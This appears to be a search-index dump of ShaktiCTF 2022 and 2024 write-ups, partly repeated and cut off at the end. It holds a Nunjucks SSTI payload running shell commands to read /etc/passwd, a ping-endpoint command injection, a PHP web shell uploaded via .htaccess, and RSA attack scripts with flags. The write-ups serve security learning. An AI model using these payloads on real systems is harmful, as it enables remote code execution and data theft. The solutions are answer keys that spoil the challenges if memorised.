Description: May I know your name? Author: Av4nth1ka Solution: So, this is a very basic Node Server-Side Template Injection challenge. First we get a page with a field to enter our username. So, if we enter any name in the username field we get a message as \u201cHello \u201d. So, we can see that whatever contents we give in the field will be displayed along with Hello. So, a thing which we can try in such cases is SSTI. Lets try a basic payload: {{2*2}} Yes!! We can confirm that this page is vulnerable to SSTI from the above case. Looking at the response headers, we can see there is a header as ** x-powered-by:** Express So, we know that Express is a node-js web application framework. So this a node SSTI vulnerability. Next we need to find which template this application is using in order to craft payload. There is a number of templates in Nodejs. Lets try with a payload of any template. I got an error like this: Template render error: (unknown path) [Line 6, Column 23] unexpected token: : at Object._prettifyError (/node_modules/nunjucks/src/lib.js:36:11) at Template.render (/node_modules/nunjucks/src/environment.js:538:21) at Environment.renderString (/node_modules/nunjucks/src/environment.js:380:17) at Object.renderString (/node_modules/nunjucks/index.js:99:14) at getHTML (/home/index.js:18:21) at app.post (/home/index.js:27:16) at Layer.handle [as handle_request] (/node_modules/express/lib/router/layer.js:95:5) at next (/node_modules/express/lib/router/route.js:144:13) at Route.dispatch (/node_modules/express/lib/router/route.js:114:3) at Layer.handle [as handle_request] (/node_modules/express/lib/router/layer.js:95:5) There was an error in rendering the template. Also we can see something called nunjucks . When we search for it, we can see that it a template in node-js vulnerable to SSTI. Read more about nunjucks: Lets try using the following payload to dump the data in /etc/passwd. payload: {{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /etc/passwd')\")()}} We get the following output: Hello root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/bin/false node:x:1000:1000::/home/node:/bin/bash So, yeah our payload works now! Lets try to dump the files in the current directory, Now we need to find where the flag is located. payload: {{range.constructor(\"return global.process.mainModule.require('child_process').execSync('ls')\")()}} So, we got the files in the current directory. Dockerfile flag index.js node package-lock.json package.json Lets try to print the contents in the flag file. payload: {{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat flag')\")()}} So we got the flag!! Flag: shaktictf{ohh!!!_nuunjucksssss_ssti}","title":"Hey h3ck3r!"},{"location":"ShaktiCTF22/web/hey/#hey-h3ck3r","text":"Description: May I know your name? Author: Av4nth1ka Solution: So, this is a very basic Node Server-Side Template Injection challenge. First we get a page with a field to enter our username. So, if we enter any name in the username field we get a message as \u201cHello \u201d. So, we can see that whatever contents we give in the field will be displayed along with Hello. So, a thing which we can try in such cases is SSTI. Lets try a basic payload: {{2*2}} Yes!! We can confirm that this page is vulnerable to SSTI from the above case. Looking at the response headers, we can see there is a header as ** x-powered-by:** Express So, we know that Express is a node-js web application framework. So this a node SSTI vulnerability. Next we need to find which template this application is using in order to craft payload. There is a number of templates in Nodejs. Lets try with a payload of any template. I got an error like this: Template render error: (unknown path) [Line 6, Column 23] unexpected token: : at Object._prettifyError (/node_modules/nunjucks/src/lib.js:36:11) at Template.render (/node_modules/nunjucks/src/environment.js:538:21) at Environment.renderString (/node_modules/nunjucks/src/environment.js:380:17) at Object.renderString (/node_modules/nunjucks/index.js:99:14) at getHTML (/home/index.js:18:21) at app.post (/home/index.js:27:16) at Layer.handle [as handle_request] (/node_modules/express/lib/router/layer.js:95:5) at next (/node_modules/express/lib/router/route.js:144:13) at Route.dispatch (/node_modules/express/lib/router/route.js:114:3) at Layer.handle [as handle_request] (/node_modules/express/lib/router/layer.js:95:5) There was an error in rendering the template. Also we can see something called nunjucks . When we search for it, we can see that it a template in node-js vulnerable to SSTI. Read more about nunjucks: Lets try using the following payload to dump the data in /etc/passwd. payload: {{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /etc/passwd')\")()}} We get the following output: Hello root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/bin/false node:x:1000:1000::/home/node:/bin/bash So, yeah our payload works now! Lets try to dump the files in the current directory, Now we need to find where the flag is located. payload: {{range.constructor(\"return global.process.mainModule.require('child_process').execSync('ls')\")()}} So, we got the files in the current directory. Dockerfile flag index.js node package-lock.json package.json Lets try to print the contents in the flag file. payload: {{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat flag')\")()}} So we got the flag!! Flag: shaktictf{ohh!!!_nuunjucksssss_ssti}","title":"Hey h3ck3r!"},{"location":"ShaktiCTF22/web/intro/","text":"Web Exploitation Challenge Name Level Author Be Alert Beginner Ramya L0g1n F4il3d Easy Av4nth1ka ping pong Easy L0xm1 S4F3 UPL04D Medium L0xm1 Hey h3ck3r! Medium Av4nth1ka","title":"Web Exploitation"},{"location":"ShaktiCTF22/web/intro/#web-exploitation","text":"Challenge Name Level Author Be Alert Beginner Ramya L0g1n F4il3d Easy Av4nth1ka ping pong Easy L0xm1 S4F3 UPL04D Medium L0xm1 Hey h3ck3r! Medium Av4nth1ka","title":"Web Exploitation"},{"location":"ShaktiCTF22/web/ping_pong/","text":"Challenge Name: Ping-Pong Author : L0xm1 Challenge Description A simple ping service .Is it vulnerable? Writeup When you visit the challenge link ,we are welcomed with \"Enter the hostname to ping Example: /ping?address=google.com\" When we visit the /ping endpoint with ?address={hostname to ping}and give /ping?address=google.com ,we get the ping response of google.com. Here if we give /ping?address=google.com|ls we can get the contents in the directory i.e (app.py flag.txt templates) When we try /ping?address=google.com|cat flag.txt it throws out an error Not Allowed which indicates cat is blacklisted. We can use head,more,tail etc to read the flag. When we give /ping?address=google.com|head flag.txt we get the flag. FLAG shaktictf{c0mm4nd_1nj3cti0n_iz_3asy_right??}","title":"Ping pong"},{"location":"ShaktiCTF22/web/ping_pong/#challenge-name-ping-pong","text":"","title":"Challenge Name: Ping-Pong"},{"location":"ShaktiCTF22/web/ping_pong/#author-l0xm1","text":"","title":"Author :L0xm1"},{"location":"ShaktiCTF22/web/ping_pong/#challenge-description","text":"A simple ping service .Is it vulnerable?","title":"Challenge Description"},{"location":"ShaktiCTF22/web/ping_pong/#writeup","text":"When you visit the challenge link ,we are welcomed with \"Enter the hostname to ping Example: /ping?address=google.com\" When we visit the /ping endpoint with ?address={hostname to ping}and give /ping?address=google.com ,we get the ping response of google.com. Here if we give /ping?address=google.com|ls we can get the contents in the directory i.e (app.py flag.txt templates) When we try /ping?address=google.com|cat flag.txt it throws out an error Not Allowed which indicates cat is blacklisted. We can use head,more,tail etc to read the flag. When we give /ping?address=google.com|head flag.txt we get the flag.","title":"Writeup"},{"location":"ShaktiCTF22/web/ping_pong/#flag","text":"shaktictf{c0mm4nd_1nj3cti0n_iz_3asy_right??}","title":"FLAG"},{"location":"ShaktiCTF22/web/safe_upload/","text":"Challenge Name : S4F3 UPL04D Author : L0xm1 Challenge Description Uploading files is safe ..right?? Writeup This is a basic file upload challenge where you can upload images of .jpg extension . If you look into the source code we can see that .php file extensions are blacklisted. We can upload a .htaccess file with the following line AddType application/x-httpd-php .jpg which executes all .jpg files as php files. After successfully uploading the .htaccess file we can upload a .jpg file containing a php shell for eg: <?php $cmd=$_GET[\"cmd\"]; $q=shell_exec($cmd); echo $q; ?> Now when we visit /uploads/{you file name}.jpg?cmd=ls / ,we can see that flag is in /flag . We can get the flag using /uploads/{you file name}.jpg?cmd=cat /flag Flag shaktictf{f1l3_upl0ad_iz_s4f3_ryt??}","title":"Safe upload"},{"location":"ShaktiCTF22/web/safe_upload/#challenge-name-s4f3-upl04d","text":"","title":"Challenge Name : S4F3 UPL04D"},{"location":"ShaktiCTF22/web/safe_upload/#author-l0xm1","text":"","title":"Author :L0xm1"},{"location":"ShaktiCTF22/web/safe_upload/#challenge-description","text":"Uploading files is safe ..right??","title":"Challenge Description"},{"location":"ShaktiCTF22/web/safe_upload/#writeup","text":"This is a basic file upload challenge where you can upload images of .jpg extension . If you look into the source code we can see that .php file extensions are blacklisted. We can upload a .htaccess file with the following line AddType application/x-httpd-php .jpg which executes all .jpg files as php files. After successfully uploading the .htaccess file we can upload a .jpg file containing a php shell for eg: <?php $cmd=$_GET[\"cmd\"]; $q=shell_exec($cmd); echo $q; ?> Now when we visit /uploads/{you file name}.jpg?cmd=ls / ,we can see that flag is in /flag . We can get the flag using /uploads/{you file name}.jpg?cmd=cat /flag","title":"Writeup"},{"location":"ShaktiCTF22/web/safe_upload/#flag","text":"shaktictf{f1l3_upl0ad_iz_s4f3_ryt??}","title":"Flag"},{"location":"ShaktiCTF24/","text":"","title":"Index"},{"location":"ShaktiCTF24/crypto/","text":"Crypto Challenge Name Level Author Flag Expedition Beginner im._.a.p eHlvl1 Easy im._.a.p eHlvl2 Easy im._.a.p Leveled RSA Medium im._.a.p , keaya","title":"Crypto"},{"location":"ShaktiCTF24/crypto/#crypto","text":"Challenge Name Level Author Flag Expedition Beginner im._.a.p eHlvl1 Easy im._.a.p eHlvl2 Easy im._.a.p Leveled RSA Medium im._.a.p , keaya","title":"Crypto"},{"location":"ShaktiCTF24/crypto/Flag_Expedition/","text":"Flag Expedition Challenge Description : Crack the cryptographic challenges to unveil the hidden flag and emerge victorious! Note : If the plaintext obtained is : HELLOWORLD , the flag submitted should be : shaktictf{hello_world} (The flag is case sensitive ) Author : im._.a.p Solution : The International code of signals has been used here. It can decrypt it using https://www.dcode.fr/maritime-signals-code or https://www.boxentriq.com/code-breaking/international-code-of-signals Flag : shaktictf{was_it_too_easy_to_find}","title":"Flag Expedition"},{"location":"ShaktiCTF24/crypto/Flag_Expedition/#flag-expedition","text":"Challenge Description : Crack the cryptographic challenges to unveil the hidden flag and emerge victorious! Note : If the plaintext obtained is : HELLOWORLD , the flag submitted should be : shaktictf{hello_world} (The flag is case sensitive ) Author : im._.a.p Solution : The International code of signals has been used here. It can decrypt it using https://www.dcode.fr/maritime-signals-code or https://www.boxentriq.com/code-breaking/international-code-of-signals Flag : shaktictf{was_it_too_easy_to_find}","title":"Flag Expedition"},{"location":"ShaktiCTF24/crypto/Leveled_RSA/","text":"Leveled RSA Challenge Description : In the sequel to our cryptography challenge, John embarks on a deeper cryptographic journey as he discovers a second email with an even more intricate code. Unraveling this complex puzzle will lead him closer to unveiling the secrets of his uncle's legacy. Can John decipher the cryptic message to unlock the next chapter of his mysterious inheritance? Author : im._.a.p Solution : -level 1 has a list of n,c given and e = 3. Decrypt it using hastad's broadcast attack. #in sage n1 = [545394152327813975627251662356063105606316337974491997295378647690615887382846479574222185770313742991341817138659024468087374639702799222795556980078412962871135642157208399755482893225016908344756760491148399064668808613965264647043153983156823158636642122298187635003705135140416384581106771445445866838902215564606282991513088309620556665381025025077916298564022149696039923514239198973728381470562114128511630255098428951603896126507814349986286926299244531906473181800300109162638238425365871862174757398704874277001803426284087704842667837102348645251524380992176692460217226318601343620321244741213250926827952549075857522163537194435684637120568449074357324295022484230373598477863999323833862106064897506150597864275794923075772562581941862580276891765425279394836654380941144060430751699947857452011664910772780374627419328270996247879965712854608282668964275936077835284502503260344526481151382108658947074683831482875758666328986700498636060663311023268378542535072919283647316207318477573989884722754317180757739484913355973631155066950443165796733672505675792650175851365294681518613533477273329114690324131488216531322890892222791915850987021015618865944951297243631358908253993350646886504460532427533372119310733737, 654433017204931030393884251520668374328578502112329065499245002616657014281719335786661515789130219785304265108980804249440767555248681599614916682862272298566529629627370058286372109201394638823768116811457370204225849129591845722537128484986632895594026295390672059538422169297165462771536815309040021941791147092890195692716368835665525512092613874164553286901414066296758277717935130187674237865068581278223382549707919786219467251565941643651468471324264919504851327570536807893676184593090369615446336982200250817405654069585848798291148949544030544445912464576019279805438673487595098987607957982360753492118751134083284569552862643696493090952715189939962405267741340948977001347141197668825546928450773716052590827997930067536828145658744783093287603067336353184698270363381995904498903929951342498169674677772505915917892511524738459697953768204999886007331374287802745911404315520429855768037418781115835733069095398879654230545925889303904167613219754390016014663223711153223936017132539402888384500403173770229974411277713123372655880066512684146667611520206481203450395544265475048082006895566549778942122244442242417697935029036598682099155322609869957736346608794418286642437622221202523419761127578473141962865846981, 656664159253722329929053881846462282075700945358858129208163124111724072395742290938901013857620037064931120187061472360789962188087748211386276211901416888383522524828300057143223768825016771396971405385977912296701653205241363268791119945482193984563702209525916146980620192041687172777300282327706567918940719192625941352443318030308174187644070886142676567420030750535823957313466487841300401041422312228995354355116513411090417618210002201895595206258178569925039733524631945374780219509872794291728386593162704950971804719827413175600084072124550356629242037519156657560708729000058763994398372598969230222262774288107534066249394374210874463105135829436822421427018885352909669880400889642929021806274477907311812473931225976972461016710112993815116030458360517452892106914594396142581080010693210638806241950845753726815623138324369459420597573301222406254185141834168861479275626072566314488512744029700973260213116392570734584708047885637360800801490671987526484030544293507014652255465525769171257967153971904160956737038424454788046814707288145060839042763689179027536837547505707225949731157318193576213129317450470898141922981363516190463218148241380489513924308008187442535923844636042242167172741489445988199453019921] c1 = [444531112929450459543429140289809619352043140696583900318472311192993219071404501187225377975892835377730046816730541364621576305148629413991072596416292771499353626694086109818825865726561717859290674936479379440924953869745802497198353628780558684040197810639946952446639846962370059860407555603707651647445778690443133041719452682307467799060452350349846151164547227915641440300614643291938358486050614365721847936496784822258945006602953910612408639602112132517355286459246759783844187587029129096933840481577127362013009336024160313155443733324065758746009769735152099454707980327657814044803785801085482527034056357955160912732839285613124640764692992125257747489943274775114507962485142119292818757934178722138157136000746473824670613239038580653315516058082689116313140371701861770391559241728912292295215566353290045617070525565808471805444285287360342155382284563438231306291727245828528779139146737448817803780592932460624820150332962163306763031728808752839666587984335901666270888268651506139805275362721042665537581020335832830312410994318025927058132047888203625481749363694992617336832831079339525064060849711014591696245478262814362615528649645003743928560170024829080375009621610610446758724714824314537539746597741, 319541171989767532755446000602097166896225347200196626508743093402224140241867314191827751378242432733903693226457027547172503513933644166879063390329737707053155660757120607000703717090604353573894803135999560634581998758344371067183496223789431710697723602791123843074248253528892325344824181541637266688749341322598016032961231749993023923925501083482721050000006912410382928977367058736582134488933487634182532948789845269245093447032949294945953727446820372956158776372159289907796522559644584267443854722343476196620885856835627994133495481903950973851962721072743126089395885542852494215551897217409794422711378515783590466394064265338734779437741278799845955991252819063591202033217363086007574680196274165659224036333800913376109841217065565944940099457568618294430030095355884383382620667834498951427954543736556654626809376215414457341164441165372685161034593542013658661053119879650343936895500400491819128442035398244226052712196047030270555306649842215320932928786690145149666668756759100776180801452219969527645958383675069449971323519557391283337465707916843374943797043686423669161710845415697699772587416614436574937381832178519103680075944054520762887757080554038678298312886042341215497149413336248405537740328940, 314059908879839211743982439271947937059807107675462631896947556928279511925709829725602844671587815181775555286443980486387392531683739236166178663508657548957709154052374595822650982768844981478766720967344389614442017880959614694423922004567205566409635186367201016881524545082953206432499470253544887989860186642066374631166504114896535230649898364765325911535379956436163079714333598585317335075342554480091881378075222805824727370003715132887676286327411075743285417931887601252064259088917354520893665152873809394053950846283996475555707043676223754046397879429722459056943614882288569319981732491865180790710996858877015686532952528110893476920835586760432230084065755668348503681437690885155192082177180849600427339431813823500295186150265147541408632605773035109157963829065124156123974842756493976775470713420070192912392424914257865130407451159134318747464239487223402412696929008760074058516565325359822843045675745818560106446225149438122412842575979293252239333514491444976586504031796450972462559975537317488157352723320981150068008900320412564599483826236513029115763658081363396644662285620153927069676732549015641908133201340628720125625078457933298534083623439395740137790446325852716936206960839127509897673926901] e = 3 x = crt(c,n) n = iroot(c,n)[0] n = 21284549846899107163445266790069890489991766265066670117740041673053919433107553508736672406349162607834712235414792600330386554613938596730990993650228249618342847405389708543298197387911282471331025034644981636516993425782156213795010982329683961515138961682735155467657695586525945578095454261918922311836296600612187601289109443231935663736544987443493636386113682960035165643727531720204063689518635839344581600837981515952908211440547342952709768315171970291853909284296553715095794156732971673185553914520950928429581557743320550954650663202465307154008283469516141679229332899580353656780903791407729488546711 -level 2 has ct,e and n which is the decrypted number in level 1. -level 2 is solved using the formula p = (c + (k n)) *(1/3). Its bruteforced, thus getting the flag. import gmpy2 n = 21284549846899107163445266790069890489991766265066670117740041673053919433107553508736672406349162607834712235414792600330386554613938596730990993650228249618342847405389708543298197387911282471331025034644981636516993425782156213795010982329683961515138961682735155467657695586525945578095454261918922311836296600612187601289109443231935663736544987443493636386113682960035165643727531720204063689518635839344581600837981515952908211440547342952709768315171970291853909284296553715095794156732971673185553914520950928429581557743320550954650663202465307154008283469516141679229332899580353656780903791407729488546711 c = 342185266855114790359426885033581315593099955970036139517231529585950600555880051526820737905498278660912142151418345314592007444924168095881727789313561844641872100681118669581612313061299477186676980038806404561173793514218086839641140591501320999312295486673483495546104061992211790913192728847973015672049545306681308733429256105324538780037196172237009273964542874625981132228600376842040977550844851046491374354106145415555991822246390203219904043617856757335634834737185790806266054565239504497260172140438968677 e = 3 for i in range(1000000000000000000000000000000000000): m, is_true_root = gmpy2.iroot(i*n + c, e) if is_true_root: print(f\"Found i = {i}\") print(\"Message: {}\".format(bytearray.fromhex(format(m, 'x')).decode())) break #Found i = 0 # Message: Here you go, great mathematician: shaktictf{H4st4d_C0pp3rsmith_r3v34l3d} Flag : shaktictf{H4st4d_C0pp3rsmith_r3v34l3d}","title":"Leveled RSA"},{"location":"ShaktiCTF24/crypto/Leveled_RSA/#leveled-rsa","text":"","title":"Leveled RSA"},{"location":"ShaktiCTF24/crypto/Leveled_RSA/#challenge-description","text":"In the sequel to our cryptography challenge, John embarks on a deeper cryptographic journey as he discovers a second email with an even more intricate code. Unraveling this complex puzzle will lead him closer to unveiling the secrets of his uncle's legacy. Can John decipher the cryptic message to unlock the next chapter of his mysterious inheritance? Author : im._.a.p","title":"Challenge Description :"},{"location":"ShaktiCTF24/crypto/Leveled_RSA/#solution","text":"-level 1 has a list of n,c given and e = 3. Decrypt it using hastad's broadcast attack. #in sage n1 = [545394152327813975627251662356063105606316337974491997295378647690615887382846479574222185770313742991341817138659024468087374639702799222795556980078412962871135642157208399755482893225016908344756760491148399064668808613965264647043153983156823158636642122298187635003705135140416384581106771445445866838902215564606282991513088309620556665381025025077916298564022149696039923514239198973728381470562114128511630255098428951603896126507814349986286926299244531906473181800300109162638238425365871862174757398704874277001803426284087704842667837102348645251524380992176692460217226318601343620321244741213250926827952549075857522163537194435684637120568449074357324295022484230373598477863999323833862106064897506150597864275794923075772562581941862580276891765425279394836654380941144060430751699947857452011664910772780374627419328270996247879965712854608282668964275936077835284502503260344526481151382108658947074683831482875758666328986700498636060663311023268378542535072919283647316207318477573989884722754317180757739484913355973631155066950443165796733672505675792650175851365294681518613533477273329114690324131488216531322890892222791915850987021015618865944951297243631358908253993350646886504460532427533372119310733737, 654433017204931030393884251520668374328578502112329065499245002616657014281719335786661515789130219785304265108980804249440767555248681599614916682862272298566529629627370058286372109201394638823768116811457370204225849129591845722537128484986632895594026295390672059538422169297165462771536815309040021941791147092890195692716368835665525512092613874164553286901414066296758277717935130187674237865068581278223382549707919786219467251565941643651468471324264919504851327570536807893676184593090369615446336982200250817405654069585848798291148949544030544445912464576019279805438673487595098987607957982360753492118751134083284569552862643696493090952715189939962405267741340948977001347141197668825546928450773716052590827997930067536828145658744783093287603067336353184698270363381995904498903929951342498169674677772505915917892511524738459697953768204999886007331374287802745911404315520429855768037418781115835733069095398879654230545925889303904167613219754390016014663223711153223936017132539402888384500403173770229974411277713123372655880066512684146667611520206481203450395544265475048082006895566549778942122244442242417697935029036598682099155322609869957736346608794418286642437622221202523419761127578473141962865846981, 656664159253722329929053881846462282075700945358858129208163124111724072395742290938901013857620037064931120187061472360789962188087748211386276211901416888383522524828300057143223768825016771396971405385977912296701653205241363268791119945482193984563702209525916146980620192041687172777300282327706567918940719192625941352443318030308174187644070886142676567420030750535823957313466487841300401041422312228995354355116513411090417618210002201895595206258178569925039733524631945374780219509872794291728386593162704950971804719827413175600084072124550356629242037519156657560708729000058763994398372598969230222262774288107534066249394374210874463105135829436822421427018885352909669880400889642929021806274477907311812473931225976972461016710112993815116030458360517452892106914594396142581080010693210638806241950845753726815623138324369459420597573301222406254185141834168861479275626072566314488512744029700973260213116392570734584708047885637360800801490671987526484030544293507014652255465525769171257967153971904160956737038424454788046814707288145060839042763689179027536837547505707225949731157318193576213129317450470898141922981363516190463218148241380489513924308008187442535923844636042242167172741489445988199453019921] c1 = [444531112929450459543429140289809619352043140696583900318472311192993219071404501187225377975892835377730046816730541364621576305148629413991072596416292771499353626694086109818825865726561717859290674936479379440924953869745802497198353628780558684040197810639946952446639846962370059860407555603707651647445778690443133041719452682307467799060452350349846151164547227915641440300614643291938358486050614365721847936496784822258945006602953910612408639602112132517355286459246759783844187587029129096933840481577127362013009336024160313155443733324065758746009769735152099454707980327657814044803785801085482527034056357955160912732839285613124640764692992125257747489943274775114507962485142119292818757934178722138157136000746473824670613239038580653315516058082689116313140371701861770391559241728912292295215566353290045617070525565808471805444285287360342155382284563438231306291727245828528779139146737448817803780592932460624820150332962163306763031728808752839666587984335901666270888268651506139805275362721042665537581020335832830312410994318025927058132047888203625481749363694992617336832831079339525064060849711014591696245478262814362615528649645003743928560170024829080375009621610610446758724714824314537539746597741, 319541171989767532755446000602097166896225347200196626508743093402224140241867314191827751378242432733903693226457027547172503513933644166879063390329737707053155660757120607000703717090604353573894803135999560634581998758344371067183496223789431710697723602791123843074248253528892325344824181541637266688749341322598016032961231749993023923925501083482721050000006912410382928977367058736582134488933487634182532948789845269245093447032949294945953727446820372956158776372159289907796522559644584267443854722343476196620885856835627994133495481903950973851962721072743126089395885542852494215551897217409794422711378515783590466394064265338734779437741278799845955991252819063591202033217363086007574680196274165659224036333800913376109841217065565944940099457568618294430030095355884383382620667834498951427954543736556654626809376215414457341164441165372685161034593542013658661053119879650343936895500400491819128442035398244226052712196047030270555306649842215320932928786690145149666668756759100776180801452219969527645958383675069449971323519557391283337465707916843374943797043686423669161710845415697699772587416614436574937381832178519103680075944054520762887757080554038678298312886042341215497149413336248405537740328940, 314059908879839211743982439271947937059807107675462631896947556928279511925709829725602844671587815181775555286443980486387392531683739236166178663508657548957709154052374595822650982768844981478766720967344389614442017880959614694423922004567205566409635186367201016881524545082953206432499470253544887989860186642066374631166504114896535230649898364765325911535379956436163079714333598585317335075342554480091881378075222805824727370003715132887676286327411075743285417931887601252064259088917354520893665152873809394053950846283996475555707043676223754046397879429722459056943614882288569319981732491865180790710996858877015686532952528110893476920835586760432230084065755668348503681437690885155192082177180849600427339431813823500295186150265147541408632605773035109157963829065124156123974842756493976775470713420070192912392424914257865130407451159134318747464239487223402412696929008760074058516565325359822843045675745818560106446225149438122412842575979293252239333514491444976586504031796450972462559975537317488157352723320981150068008900320412564599483826236513029115763658081363396644662285620153927069676732549015641908133201340628720125625078457933298534083623439395740137790446325852716936206960839127509897673926901] e = 3 x = crt(c,n) n = iroot(c,n)[0] n = 21284549846899107163445266790069890489991766265066670117740041673053919433107553508736672406349162607834712235414792600330386554613938596730990993650228249618342847405389708543298197387911282471331025034644981636516993425782156213795010982329683961515138961682735155467657695586525945578095454261918922311836296600612187601289109443231935663736544987443493636386113682960035165643727531720204063689518635839344581600837981515952908211440547342952709768315171970291853909284296553715095794156732971673185553914520950928429581557743320550954650663202465307154008283469516141679229332899580353656780903791407729488546711 -level 2 has ct,e and n which is the decrypted number in level 1. -level 2 is solved using the formula p = (c + (k n)) *(1/3). Its bruteforced, thus getting the flag. import gmpy2 n = 21284549846899107163445266790069890489991766265066670117740041673053919433107553508736672406349162607834712235414792600330386554613938596730990993650228249618342847405389708543298197387911282471331025034644981636516993425782156213795010982329683961515138961682735155467657695586525945578095454261918922311836296600612187601289109443231935663736544987443493636386113682960035165643727531720204063689518635839344581600837981515952908211440547342952709768315171970291853909284296553715095794156732971673185553914520950928429581557743320550954650663202465307154008283469516141679229332899580353656780903791407729488546711 c = 342185266855114790359426885033581315593099955970036139517231529585950600555880051526820737905498278660912142151418345314592007444924168095881727789313561844641872100681118669581612313061299477186676980038806404561173793514218086839641140591501320999312295486673483495546104061992211790913192728847973015672049545306681308733429256105324538780037196172237009273964542874625981132228600376842040977550844851046491374354106145415555991822246390203219904043617856757335634834737185790806266054565239504497260172140438968677 e = 3 for i in range(1000000000000000000000000000000000000): m, is_true_root = gmpy2.iroot(i*n + c, e) if is_true_root: print(f\"Found i = {i}\") print(\"Message: {}\".format(bytearray.fromhex(format(m, 'x')).decode())) break #Found i = 0 # Message: Here you go, great mathematician: shaktictf{H4st4d_C0pp3rsmith_r3v34l3d} Flag : shaktictf{H4st4d_C0pp3rsmith_r3v34l3d}","title":"Solution :"},{"location":"ShaktiCTF24/crypto/eHlvl1/","text":"eHlvl1 Challenge Description : John, an ordinary office worker, receives a mysterious email filled with seemingly random numbers, letters and codes. Little does he know, it holds the key to uncovering a hidden treasure left behind by his eccentric uncle who loved ciphers and encryptions. To claim his unexpected inheritance, John must decipher the cryptic message using his newfound skills in cryptography. source.py from Crypto.Util.number import* from gmpy2 import * from secret import e,b,hint,msg,d p = getPrime(512) q = getPrime(512) n = p*q m = bytes_to_long(msg) h = bytes([i^b for i in hint]) print(f\"h = {hex(bytes_to_long(h))}\") ct = pow(m,e,n) de = pow(ct,d,n) assert(m == de) print(\"ct = \",ct) print(\"p = \",p) print(\"q = \",q) output.txt h = 0x6f535e1b5e1b061b0c020f0b0b10134f535e1b4852555c575e1b59424f5e1b4f535a4f1b4c5a481b4354495e5f121b0112 ct = 90411409551177819360717236462351545237822367597930505531741437834918499125195272674859389978951589180632146502190429979348445123366914000167832349866368754227474060832624537550600921894849466284315037863094795265822884392628050584343158613338754532642964368052098136565157343201877382609610774291396944124354 p = 10425866553433272288676977376976736493869099145622614885498170561565122111495807572631609087909399078701783905493563029715011322065331636751277834978526061 q = 9215753518399683669080201592666232851634627861957009698720674021492716071355990364002777325458055207969176695525292834842774295594232711456066623178861093 Author : im._.a.p Solution : Values of 'p','q','ciphertext','h'(encrypted hint which has the value of e) is given. Th value of the modulus can be found using 'p' and 'q' as p*q = n. From the given code, we understand that 'hint' is xored with a random byte 'b' to get the ciphertext h. To find 'hint', 'h' is xored with each single byte (bruteforced) to get 'hint', thus getting the value of e. from string import printable h= '6f535e1b5e1b061b0c020f0b0b10134f535e1b4852555c575e1b59424f5e1b4f535a4f1b4c5a481b4354495e5f121b0112' m= bytes.fromhex(h) for i in range(256): x=bytes(i^j for j in m) try: x = x.decode() for j in x: assert j in printable print(i,x) except: pass 59 The e = 79400+(the single byte that was xored) :) e = 79459 With the values 'e','n','p','q', the ciphertext ct can be decrypted to get the message. e = 79459 n = p*q phi = (p-1)*(q-1) d = invert(e,phi) print(d) hint = pow(ct,d,n) print(long_to_bytes(hint)) b\"Here is your reward 'vvrkxuqgi{r0i43m0r_f0_hu3_u3gtu3!!!}' You can ask 'Doraemon' to help you with this. Bye!!\" vinegere cipher key : doraemon The message has the encrypted flag and key which is to be decrypted.(vinegere cipher). Flag : shaktictf{d0r43m0n_t0_th3_r3scu3!!!}","title":"eHlvl1"},{"location":"ShaktiCTF24/crypto/eHlvl1/#ehlvl1","text":"Challenge Description : John, an ordinary office worker, receives a mysterious email filled with seemingly random numbers, letters and codes. Little does he know, it holds the key to uncovering a hidden treasure left behind by his eccentric uncle who loved ciphers and encryptions. To claim his unexpected inheritance, John must decipher the cryptic message using his newfound skills in cryptography. source.py from Crypto.Util.number import* from gmpy2 import * from secret import e,b,hint,msg,d p = getPrime(512) q = getPrime(512) n = p*q m = bytes_to_long(msg) h = bytes([i^b for i in hint]) print(f\"h = {hex(bytes_to_long(h))}\") ct = pow(m,e,n) de = pow(ct,d,n) assert(m == de) print(\"ct = \",ct) print(\"p = \",p) print(\"q = \",q) output.txt h = 0x6f535e1b5e1b061b0c020f0b0b10134f535e1b4852555c575e1b59424f5e1b4f535a4f1b4c5a481b4354495e5f121b0112 ct = 90411409551177819360717236462351545237822367597930505531741437834918499125195272674859389978951589180632146502190429979348445123366914000167832349866368754227474060832624537550600921894849466284315037863094795265822884392628050584343158613338754532642964368052098136565157343201877382609610774291396944124354 p = 